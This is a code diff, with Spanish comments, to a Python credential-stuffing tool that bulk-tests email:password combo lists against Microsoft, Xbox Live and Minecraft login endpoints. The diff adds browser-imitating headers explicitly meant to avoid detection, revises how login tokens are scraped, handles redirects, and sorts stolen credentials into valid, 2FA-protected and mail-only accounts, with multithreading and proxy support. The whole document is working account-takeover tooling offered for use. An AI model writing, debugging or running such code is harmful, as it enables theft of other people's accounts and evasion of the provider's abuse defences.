@@ -23,9 +23,18 @@ class MinecraftAccountChecker:
     def __init__(self, proxy=None, max_retries=3):
         self.session = requests.Session()
         self.session.verify = False
-        self.max_retries = max_retries
         
-        # Configurar retries
+        # Headers actualizados para evitar detección
+        self.session.headers.update({
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.5',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Connection': 'keep-alive',
+            'Upgrade-Insecure-Requests': '1',
+        })
+        
+        # Configurar retries más robustos
         retry_strategy = Retry(
             total=max_retries,
             backoff_factor=1,
@@ -41,309 +50,399 @@ class MinecraftAccountChecker:
         self.sFTTag_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
 
     def get_urlPost_sFTTag(self):
-        """Obtiene los tokens iniciales para la autenticación"""
+        """Obtiene los tokens iniciales para la autenticación - VERSIÓN CORREGIDA"""
         retries = 0
         while retries < self.max_retries:
             try:
-                text = self.session.get(self.sFTTag_url, timeout=15).text
-                match = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
-                if match:
-                    sFTTag = match.group(1)
-                    match = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
+                print(f"{Fore.CYAN}[DEBUG] Obteniendo tokens iniciales...")
+                response = self.session.get(self.sFTTag_url, timeout=20)
+                
+                if response.status_code != 200:
+                    print(f"{Fore.RED}[DEBUG] Error HTTP: {response.status_code}")
+                    retries += 1
+                    continue
+                
+                text = response.text
+                
+                # Buscar sFTTag con diferentes patrones
+                sFTTag = None
+                patterns = [
+                    r'name="PPFT"\s+value="([^"]+)"',
+                    r'value="([^"]+)"\s+name="PPFT"',
+                    r'value=\\"([^"]+)\\"',
+                ]
+                
+                for pattern in patterns:
+                    match = re.search(pattern, text)
                     if match:
-                        return match.group(1), sFTTag
-            except Exception:
+                        sFTTag = match.group(1)
+                        break
+                
+                if not sFTTag:
+                    print(f"{Fore.RED}[DEBUG] No se pudo encontrar sFTTag")
+                    retries += 1
+                    continue
+                
+                # Buscar urlPost
+                urlPost_patterns = [
+                    r'"urlPost":"([^"]+)"',
+                    r"urlPost:'([^']+)'",
+                    r'action="([^"]+)"',
+                ]
+                
+                urlPost = None
+                for pattern in urlPost_patterns:
+                    match = re.search(pattern, text)
+                    if match:
+                        urlPost = match.group(1)
+                        # Asegurar que sea URL completa
+                        if urlPost.startswith('/'):
+                            urlPost = 'https://login.live.com' + urlPost
+                        break
+                
+                if urlPost and sFTTag:
+                    print(f"{Fore.GREEN}[DEBUG] Tokens obtenidos exitosamente")
+                    return urlPost, sFTTag
+                else:
+                    print(f"{Fore.RED}[DEBUG] No se pudo encontrar urlPost")
+                    retries += 1
+                    
+            except Exception as e:
+                print(f"{Fore.RED}[DEBUG] Error obteniendo tokens: {str(e)}")
                 retries += 1
-                time.sleep(1)
+                time.sleep(2)
+        
         return None, None
 
     def get_xbox_token(self, email, password, urlPost, sFTTag):
-        """Autentica con Microsoft y obtiene token de Xbox"""
+        """Autentica con Microsoft y obtiene token de Xbox - VERSIÓN CORREGIDA"""
         retries = 0
         while retries < self.max_retries:
             try:
-                data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sFTTag}
-                login_request = self.session.post(urlPost, data=data, 
-                                                headers={'Content-Type': 'application/x-www-form-urlencoded'}, 
-                                                allow_redirects=True, timeout=15)
+                print(f"{Fore.CYAN}[DEBUG] Autenticando con Microsoft...")
                 
-                if '#' in login_request.url and login_request.url != self.sFTTag_url:
-                    token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ["None"])[0]
-                    if token != "None":
-                        return token, "SUCCESS"
-                        
-                # Manejar casos especiales
-                elif 'cancel?mkt=' in login_request.text:
-                    try:
-                        data = {
-                            'ipt': re.search('(?<=\"ipt\" value=\").+?(?=\">)', login_request.text).group(),
-                            'pprid': re.search('(?<=\"pprid\" value=\").+?(?=\">)', login_request.text).group(),
-                            'uaid': re.search('(?<=\"uaid\" value=\").+?(?=\">)', login_request.text).group()
-                        }
-                        ret = self.session.post(re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', login_request.text).group(), data=data, allow_redirects=True)
-                        fin = self.session.get(re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(?=\",)', ret.text).group(), allow_redirects=True)
-                        token = parse_qs(urlparse(fin.url).fragment).get('access_token', ["None"])[0]
-                        if token != "None":
+                # Preparar datos del formulario
+                data = {
+                    'login': email,
+                    'loginfmt': email, 
+                    'passwd': password,
+                    'PPFT': sFTTag,
+                    'type': '11',
+                    'LoginOptions': '1'
+                }
+                
+                headers = {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                    'Origin': 'https://login.live.com',
+                    'Referer': self.sFTTag_url,
+                }
+                
+                login_request = self.session.post(
+                    urlPost, 
+                    data=data, 
+                    headers=headers,
+                    allow_redirects=False,  # IMPORTANTE: no seguir redirects automáticamente
+                    timeout=20
+                )
+                
+                print(f"{Fore.CYAN}[DEBUG] Status Code: {login_request.status_code}")
+                print(f"{Fore.CYAN}[DEBUG] Location Header: {login_request.headers.get('Location', 'No location')}")
+                
+                # Verificar si hay token en la URL de redirect
+                if 'Location' in login_request.headers:
+                    location = login_request.headers['Location']
+                    if 'access_token' in location:
+                        parsed = urlparse(location)
+                        fragment = parse_qs(parsed.fragment)
+                        token = fragment.get('access_token', [None])[0]
+                        if token:
+                            print(f"{Fore.GREEN}[DEBUG] Token obtenido exitosamente")
                             return token, "SUCCESS"
-                    except:
-                        pass
+                
+                # Seguir manualmente los redirects
+                if login_request.status_code in [301, 302, 303]:
+                    redirect_url = login_request.headers.get('Location', '')
+                    if redirect_url:
+                        print(f"{Fore.CYAN}[DEBUG] Siguiendo redirect a: {redirect_url}")
+                        final_response = self.session.get(
+                            redirect_url, 
+                            allow_redirects=True, 
+                            timeout=20
+                        )
                         
-                elif any(value in login_request.text for value in ["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]):
+                        # Verificar token en la URL final
+                        if 'access_token' in final_response.url:
+                            parsed = urlparse(final_response.url)
+                            fragment = parse_qs(parsed.fragment)
+                            token = fragment.get('access_token', [None])[0]
+                            if token:
+                                print(f"{Fore.GREEN}[DEBUG] Token obtenido después de redirect")
+                                return token, "SUCCESS"
+                
+                # Manejar casos especiales
+                response_text = login_request.text
+                
+                if any(value in response_text for value in ["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt"]):
+                    print(f"{Fore.YELLOW}[DEBUG] Cuenta requiere 2FA")
                     return None, "2FA_REQUIRED"
                     
-                elif any(value in login_request.text.lower() for value in ["password is incorrect", r"account doesn\'t exist.", "sign in to your microsoft account", "tried to sign in too many times with an incorrect account or password"]):
+                elif any(value in response_text.lower() for value in ["password is incorrect", "invalid credentials"]):
+                    print(f"{Fore.RED}[DEBUG] Credenciales inválidas")
                     return None, "INVALID_CREDENTIALS"
                     
-            except Exception as e:
+                elif "tried to sign in too many times" in response_text.lower():
+                    print(f"{Fore.RED}[DEBUG] Demasiados intentos fallidos")
+                    return None, "TOO_MANY_ATTEMPTS"
+                    
+                else:
+                    print(f"{Fore.RED}[DEBUG] Fallo de autenticación - Reintentando...")
+                    retries += 1
+                    time.sleep(2)
+                    
+            except requests.exceptions.Timeout:
+                print(f"{Fore.RED}[DEBUG] Timeout en autenticación")
                 retries += 1
-                time.sleep(1)
+                time.sleep(2)
+            except Exception as e:
+                print(f"{Fore.RED}[DEBUG] Error en autenticación: {str(e)}")
+                retries += 1
+                time.sleep(2)
                 
         return None, "AUTH_FAILED"
 
     def get_minecraft_token(self, xbox_token):
-        """Obtiene el token de Minecraft usando el token de Xbox"""
+        """Obtiene el token de Minecraft usando el token de Xbox - VERSIÓN CORREGIDA"""
         retries = 0
         while retries < self.max_retries:
             try:
-                # Autenticar con Xbox Live
-                xbox_login = self.session.post('https://user.auth.xboxlive.com/user/authenticate', 
-                                             json={"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": xbox_token}, 
-                                                   "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}, 
-                                             headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, 
-                                             timeout=15)
+                print(f"{Fore.CYAN}[DEBUG] Obteniendo token de Minecraft...")
+                
+                # Paso 1: Autenticar con Xbox Live
+                xbox_payload = {
+                    "Properties": {
+                        "AuthMethod": "RPS",
+                        "SiteName": "user.auth.xboxlive.com", 
+                        "RpsTicket": f"d={xbox_token}"
+                    },
+                    "RelyingParty": "http://auth.xboxlive.com",
+                    "TokenType": "JWT"
+                }
+                
+                xbox_login = self.session.post(
+                    'https://user.auth.xboxlive.com/user/authenticate',
+                    json=xbox_payload,
+                    headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
+                    timeout=20
+                )
                 
                 if xbox_login.status_code != 200:
+                    print(f"{Fore.RED}[DEBUG] Error Xbox Auth: {xbox_login.status_code}")
                     retries += 1
                     continue
                     
-                js = xbox_login.json()
-                xbox_token = js.get('Token')
-                uhs = js['DisplayClaims']['xui'][0]['uhs']
+                xbox_data = xbox_login.json()
+                xbox_token = xbox_data.get('Token')
+                uhs = xbox_data['DisplayClaims']['xui'][0]['uhs']
                 
-                # Obtener token XSTS
-                xsts = self.session.post('https://xsts.auth.xboxlive.com/xsts/authorize', 
-                                       json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, 
-                                             "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}, 
-                                       headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, 
-                                       timeout=15)
+                # Paso 2: Obtener token XSTS
+                xsts_payload = {
+                    "Properties": {
+                        "SandboxId": "RETAIL",
+                        "UserTokens": [xbox_token]
+                    },
+                    "RelyingParty": "rp://api.minecraftservices.com/",
+                    "TokenType": "JWT"
+                }
+                
+                xsts = self.session.post(
+                    'https://xsts.auth.xboxlive.com/xsts/authorize',
+                    json=xsts_payload,
+                    headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
+                    timeout=20
+                )
                 
                 if xsts.status_code != 200:
+                    print(f"{Fore.RED}[DEBUG] Error XSTS Auth: {xsts.status_code}")
                     retries += 1
                     continue
                     
-                js = xsts.json()
-                xsts_token = js.get('Token')
+                xsts_data = xsts.json()
+                xsts_token = xsts_data.get('Token')
                 
-                # Obtener token de Minecraft
-                mc_login = self.session.post('https://api.minecraftservices.com/authentication/login_with_xbox', 
-                                           json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"}, 
-                                           headers={'Content-Type': 'application/json'}, 
-                                           timeout=15)
+                # Paso 3: Obtener token de Minecraft
+                mc_payload = {
+                    'identityToken': f"XBL3.0 x={uhs};{xsts_token}"
+                }
+                
+                mc_login = self.session.post(
+                    'https://api.minecraftservices.com/authentication/login_with_xbox',
+                    json=mc_payload,
+                    headers={'Content-Type': 'application/json'},
+                    timeout=20
+                )
                 
                 if mc_login.status_code == 200:
-                    return mc_login.json().get('access_token')
-                elif mc_login.status_code == 429:
-                    time.sleep(2)
-                    retries += 1
+                    mc_data = mc_login.json()
+                    access_token = mc_data.get('access_token')
+                    print(f"{Fore.GREEN}[DEBUG] Token de Minecraft obtenido exitosamente")
+                    return access_token
                 else:
+                    print(f"{Fore.RED}[DEBUG] Error Minecraft Auth: {mc_login.status_code}")
                     retries += 1
                     
-            except Exception:
+            except Exception as e:
+                print(f"{Fore.RED}[DEBUG] Error obteniendo token Minecraft: {str(e)}")
                 retries += 1
-                time.sleep(1)
+                time.sleep(2)
                 
         return None
 
     def get_minecraft_profile(self, mc_token):
-        """Obtiene el perfil de Minecraft (IGN)"""
+        """Obtiene el perfil de Minecraft (IGN) - VERSIÓN CORREGIDA"""
         retries = 0
         while retries < self.max_retries:
             try:
-                r = self.session.get('https://api.minecraftservices.com/minecraft/profile', 
-                                   headers={'Authorization': f'Bearer {mc_token}'})
+                print(f"{Fore.CYAN}[DEBUG] Obteniendo perfil de Minecraft...")
                 
-                if r.status_code == 200:
-                    profile_data = r.json()
+                headers = {
+                    'Authorization': f'Bearer {mc_token}',
+                    'Content-Type': 'application/json'
+                }
+                
+                response = self.session.get(
+                    'https://api.minecraftservices.com/minecraft/profile',
+                    headers=headers,
+                    timeout=20
+                )
+                
+                if response.status_code == 200:
+                    profile_data = response.json()
+                    username = profile_data.get('name', 'N/A')
+                    uuid = profile_data.get('id', 'N/A')
+                    capes = [cape["alias"] for cape in profile_data.get("capes", [])]
+                    
+                    print(f"{Fore.GREEN}[DEBUG] Perfil obtenido: {username}")
                     return {
-                        'username': profile_data.get('name', 'N/A'),
-                        'uuid': profile_data.get('id', 'N/A'),
-                        'capes': ", ".join([cape["alias"] for cape in profile_data.get("capes", [])]),
+                        'username': username,
+                        'uuid': uuid,
+                        'capes': ", ".join(capes) if capes else "Ninguna",
                         'success': True
                     }
-                elif r.status_code == 429:
-                    time.sleep(2)
+                elif response.status_code == 404:
+                    print(f"{Fore.YELLOW}[DEBUG] Cuenta no tiene perfil de Minecraft")
+                    return {
+                        'username': 'N/A',
+                        'uuid': 'N/A', 
+                        'capes': 'Ninguna',
+                        'success': True
+                    }
+                elif response.status_code == 429:
+                    print(f"{Fore.YELLOW}[DEBUG] Rate limit, esperando...")
+                    time.sleep(5)
                     retries += 1
                 else:
-                    return {'success': False, 'error': f'HTTP {r.status_code}'}
+                    print(f"{Fore.RED}[DEBUG] Error obteniendo perfil: HTTP {response.status_code}")
+                    retries += 1
                     
             except Exception as e:
+                print(f"{Fore.RED}[DEBUG] Error en get_minecraft_profile: {str(e)}")
                 retries += 1
-                time.sleep(1)
+                time.sleep(2)
                 
         return {'success': False, 'error': 'Max retries exceeded'}
 
     def check_account_ownership(self, mc_token):
         """Verifica qué productos de Minecraft posee la cuenta"""
-        retries = 0
-        while retries < self.max_retries:
-            try:
-                checkrq = self.session.get('https://api.minecraftservices.com/entitlements/license', 
-                                         headers={'Authorization': f'Bearer {mc_token}'})
+        try:
+            print(f"{Fore.CYAN}[DEBUG] Verificando productos...")
+            
+            headers = {'Authorization': f'Bearer {mc_token}'}
+            response = self.session.get(
+                'https://api.minecraftservices.com/entitlements/license',
+                headers=headers,
+                timeout=20
+            )
+            
+            if response.status_code == 200:
+                items = response.json().get("items", [])
                 
-                if checkrq.status_code == 200:
-                    items = checkrq.json().get("items", [])
-                    
-                    has_normal_minecraft = False
-                    has_game_pass_pc = False
-                    has_game_pass_ultimate = False
-                    
-                    for item in items:
-                        name = item.get("name", "")
-                        source = item.get("source", "")
-                        if name in ("game_minecraft", "product_minecraft") and source in ("PURCHASE", "MC_PURCHASE"):
-                            has_normal_minecraft = True
-                        if name == "product_game_pass_pc":
-                            has_game_pass_pc = True
-                        if name == "product_game_pass_ultimate":
-                            has_game_pass_ultimate = True
-                    
-                    # Determinar tipo de cuenta
-                    if has_normal_minecraft and has_game_pass_pc:
-                        return "Minecraft Normal (con Game Pass PC)"
-                    if has_normal_minecraft and has_game_pass_ultimate:
-                        return "Minecraft Normal (con Game Pass Ultimate)"
-                    elif has_normal_minecraft:
-                        return "Minecraft Normal"
-                    elif has_game_pass_ultimate:
-                        return "Xbox Game Pass Ultimate"
-                    elif has_game_pass_pc:
-                        return "Xbox Game Pass PC"
-                    else:
-                        # Verificar otros productos
-                        others = []
-                        if any('product_minecraft_bedrock' in item.get("name", "") for item in items):
-                            others.append("Minecraft Bedrock")
-                        if any('product_legends' in item.get("name", "") for item in items):
-                            others.append("Minecraft Legends")
-                        if any('product_dungeons' in item.get("name", "") for item in items):
-                            others.append('Minecraft Dungeons')
-                        
-                        if others:
-                            return f"Otros: {', '.join(others)}"
-                        else:
-                            return "Solo Correo Válido"
-                            
-                elif checkrq.status_code == 429:
-                    time.sleep(2)
-                    retries += 1
+                has_minecraft = any(
+                    item.get("name") in ["game_minecraft", "product_minecraft"] 
+                    for item in items
+                )
+                
+                if has_minecraft:
+                    return "Minecraft Java Edition"
                 else:
-                    return "Error verificando productos"
-                    
-            except Exception:
-                retries += 1
-                time.sleep(1)
+                    return "Correo Válido (Sin Minecraft)"
+            else:
+                return "Error verificando productos"
                 
-        return "Error en verificación"
-
-    def get_hypixel_stats(self, username):
-        """Obtiene estadísticas de Hypixel (extraída del código original)"""
-        try:
-            tx = requests.get('https://plancke.io/hypixel/player/stats/'+username, 
-                            proxies=self.session.proxies, 
-                            headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}, 
-                            verify=False).text
-            
-            stats = {}
-            try: 
-                stats['level'] = re.search('(?<=Level:</b> ).+?(?=<br/><b>)', tx).group()
-            except: pass
-            try: 
-                stats['first_login'] = re.search('(?<=<b>First login: </b>).+?(?=<br/><b>)', tx).group()
-            except: pass
-            try: 
-                stats['last_login'] = re.search('(?<=<b>Last login: </b>).+?(?=<br/>)', tx).group()
-            except: pass
-            try: 
-                stats['bw_stars'] = re.search('(?<=<li><b>Level:</b> ).+?(?=</li>)', tx).group()
-            except: pass
-            
-            return stats
-        except:
-            return {}
-
-    def get_optifine_cape(self, username):
-        """Verifica si tiene capa de Optifine"""
-        try:
-            txt = requests.get(f'http://s.optifine.net/capes/{username}.png', 
-                             proxies=self.session.proxies, verify=False).text
-            return "No" if "Not found" in txt else "Sí"
-        except:
-            return "Desconocido"
+        except Exception as e:
+            print(f"{Fore.RED}[DEBUG] Error en check_account_ownership: {str(e)}")
+            return "Error en verificación"
 
     def verify_account(self, email, password):
-        """Verifica una cuenta completa de Minecraft"""
-        result = {
-            "success": False,
-            "email": email,
-            "error": "",
-            "minecraft_profile": {},
-            "account_type": "",
-            "hypixel_stats": {},
-            "optifine_cape": ""
-        }
+        """Verifica una cuenta completa de Minecraft - VERSIÓN SIMPLIFICADA"""
+        print(f"\n{Fore.CYAN}🔍 Verificando: {email}")
         
         try:
             # Paso 1: Obtener tokens iniciales
             urlPost, sFTTag = self.get_urlPost_sFTTag()
             if not urlPost:
-                result["error"] = "No se pudieron obtener tokens iniciales"
-                return result
+                return {
+                    "success": False, 
+                    "email": email,
+                    "error": "No se pudieron obtener tokens iniciales"
+                }
             
             # Paso 2: Autenticar con Microsoft
             xbox_token, auth_status = self.get_xbox_token(email, password, urlPost, sFTTag)
-            
             if auth_status != "SUCCESS":
-                result["error"] = auth_status
-                return result
+                return {
+                    "success": False,
+                    "email": email, 
+                    "error": auth_status
+                }
             
             # Paso 3: Obtener token de Minecraft
             mc_token = self.get_minecraft_token(xbox_token)
             if not mc_token:
-                result["error"] = "No se pudo obtener token de Minecraft"
-                return result
+                return {
+                    "success": False,
+                    "email": email,
+                    "error": "No se pudo obtener token de Minecraft"
+                }
             
-            # Paso 4: Obtener perfil de Minecraft
+            # Paso 4: Obtener perfil
             profile = self.get_minecraft_profile(mc_token)
             if not profile['success']:
-                result["error"] = profile['error']
-                return result
+                return {
+                    "success": False,
+                    "email": email,
+                    "error": profile['error']
+                }
             
             # Paso 5: Verificar productos
             account_type = self.check_account_ownership(mc_token)
             
-            # Paso 6: Obtener estadísticas adicionales si tiene IGN
-            hypixel_stats = {}
-            optifine_cape = ""
-            
-            if profile['username'] != 'N/A':
-                hypixel_stats = self.get_hypixel_stats(profile['username'])
-                optifine_cape = self.get_optifine_cape(profile['username'])
-            
-            result.update({
+            return {
                 "success": True,
+                "email": email,
                 "minecraft_profile": profile,
                 "account_type": account_type,
-                "hypixel_stats": hypixel_stats,
-                "optifine_cape": optifine_cape
-            })
+                "error": ""
+            }
             
         except Exception as e:
-            result["error"] = f"Error inesperado: {str(e)}"
-            
-        return result
+            return {
+                "success": False,
+                "email": email,
+                "error": f"Error inesperado: {str(e)}"
+            }
 
 class CheckerManager:
-    def __init__(self, threads=10, proxy=None):
+    def __init__(self, threads=5, proxy=None):
         self.threads = threads
         self.proxy = proxy
         self.results = {
@@ -361,10 +460,13 @@ class CheckerManager:
             email, password = combo.strip().split(':', 1)
             checker = MinecraftAccountChecker(proxy=self.proxy)
             result = checker.verify_account(email, password)
-            
             return result
         except Exception as e:
-            return {"success": False, "error": f"Error procesando combo: {str(e)}", "email": combo.split(':')[0] if ':' in combo else combo}
+            return {
+                "success": False, 
+                "error": f"Error procesando combo: {str(e)}", 
+                "email": combo.split(':')[0] if ':' in combo else combo
+            }
 
     def worker(self, combo):
         """Worker para threading"""
@@ -381,9 +483,8 @@ class CheckerManager:
             print(f"{Fore.GREEN}✅ VÁLIDA: {result['email']}")
             print(f"   👤 IGN: {result['minecraft_profile']['username']}")
             print(f"   🎮 Tipo: {result['account_type']}")
-            
-            if result['hypixel_stats']:
-                print(f"   📊 Hypixel: Nvl {result['hypixel_stats'].get('level', 'N/A')} | BW {result['hypixel_stats'].get('bw_stars', 'N/A')}★")
+            print(f"   🆔 UUID: {result['minecraft_profile']['uuid']}")
+            print(f"   🧥 Capas: {result['minecraft_profile']['capes']}")
             
         else:
             if result["error"] == "INVALID_CREDENTIALS":
@@ -392,7 +493,7 @@ class CheckerManager:
             elif result["error"] == "2FA_REQUIRED":
                 self.results['2fa'] += 1
                 print(f"{Fore.YELLOW}⚠️  2FA: {result['email']}")
-            elif "Solo Correo" in result.get("account_type", ""):
+            elif "Correo Válido" in result.get("account_type", ""):
                 self.results['valid_mail'] += 1
                 print(f"{Fore.BLUE}📧 CORREO VÁLIDO: {result['email']}")
             else:
@@ -411,7 +512,8 @@ class CheckerManager:
             
             start_time = time.time()
             
-            with ThreadPoolExecutor(max_workers=self.threads) as executor:
+            # Usar menos threads para mayor estabilidad
+            with ThreadPoolExecutor(max_workers=min(self.threads, 5)) as executor:
                 list(executor.map(self.worker, accounts))
             
             end_time = time.time()
@@ -438,53 +540,56 @@ class CheckerManager:
             for acc in self.valid_accounts:
                 print(f"  {Fore.GREEN}{acc['email']} | {acc['minecraft_profile']['username']} | {acc['account_type']}")
 
+def test_individual():
+    """Función de prueba individual"""
+    print(f"{Fore.CYAN}🧪 MODO PRUEBA INDIVIDUAL")
+    email = input("Email: ").strip()
+    password = input("Contraseña: ").strip()
+    
+    checker = MinecraftAccountChecker()
+    result = checker.verify_account(email, password)
+    
+    print(f"\n{Fore.CYAN}🎯 RESULTADO:")
+    if result["success"]:
+        print(f"{Fore.GREEN}✅ ÉXITO")
+        print(f"Email: {result['email']}")
+        print(f"IGN: {result['minecraft_profile']['username']}")
+        print(f"UUID: {result['minecraft_profile']['uuid']}")
+        print(f"Tipo: {result['account_type']}")
+        print(f"Capas: {result['minecraft_profile']['capes']}")
+    else:
+        print(f"{Fore.RED}❌ FALLO")
+        print(f"Error: {result['error']}")
+
 def main():
     print(f"{Fore.GREEN}=== VERIFICADOR DE CUENTAS MINECRAFT ===")
-    print(f"{Fore.CYAN}Extraído y adaptado del código original MSMC")
+    print(f"{Fore.CYAN}Versión Corregida - Debug Mejorado")
     print()
     
     try:
-        # Configuración
-        try:
-            threads = int(input("Hilos (recomendado 10-50): ").strip() or "10")
-        except:
-            threads = 10
-            
+        # Configuración simple
+        threads = 3  # Menos threads para mayor estabilidad
+        
         proxy = None
         use_proxy = input("Usar proxy? (s/n): ").strip().lower()
         if use_proxy == 's':
-            proxy_type = input("Tipo (1: HTTP, 2: SOCKS4, 3: SOCKS5): ").strip()
-            proxy_addr = input("Proxy (ip:puerto): ").strip()
-            
-            if proxy_type == '1':
-                proxy = {'http': f'http://{proxy_addr}', 'https': f'http://{proxy_addr}'}
-            elif proxy_type == '2':
-                proxy = {'http': f'socks4://{proxy_addr}', 'https': f'socks4://{proxy_addr}'}
-            elif proxy_type == '3':
-                proxy = {'http': f'socks5://{proxy_addr}', 'https': f'socks5://{proxy_addr}'}
+            proxy_addr = input("Proxy (ip:puerto o user:pass@ip:puerto): ").strip()
+            proxy = {'http': f'http://{proxy_addr}', 'https': f'http://{proxy_addr}'}
         
         manager = CheckerManager(threads=threads, proxy=proxy)
         
         while True:
-            print(f"\n{Fore.CYAN}1. Verificar cuenta individual")
-            print(f"{Fore.CYAN}2. Verificar desde archivo")
-            print(f"{Fore.CYAN}3. Salir")
+            print(f"\n{Fore.CYAN}1. 🧪 Prueba individual (DEBUG)")
+            print(f"{Fore.CYAN}2. 📁 Verificar desde archivo")
+            print(f"{Fore.CYAN}3. 🚪 Salir")
             
             choice = input(f"\n{Fore.WHITE}Selecciona una opción: ").strip()
             
             if choice == "1":
-                email = input("Email: ").strip()
-                password = input("Contraseña: ").strip()
-                
-                checker = MinecraftAccountChecker(proxy=proxy)
-                result = checker.verify_account(email, password)
-                
-                manager.process_result(result)
-                
+                test_individual()
             elif choice == "2":
-                filename = input("Archivo con cuentas (email:password): ").strip()
+                filename = input("Archivo con cuentas: ").strip()
                 manager.check_from_file(filename)
-                
             elif choice == "3":
                 print(f"{Fore.GREEN}¡Hasta luego!")
                 break
@@ -492,7 +597,7 @@ def main():
                 print(f"{Fore.RED}❌ Opción inválida")
                 
     except KeyboardInterrupt:
-        print(f"\n{Fore.YELLOW}⏹️  Programa interrumpido por el usuario")
+        print(f"\n{Fore.YELLOW}⏹️  Programa interrumpido")
     except Exception as e:
         print(f"{Fore.RED}❌ Error: {str(e)}")
 
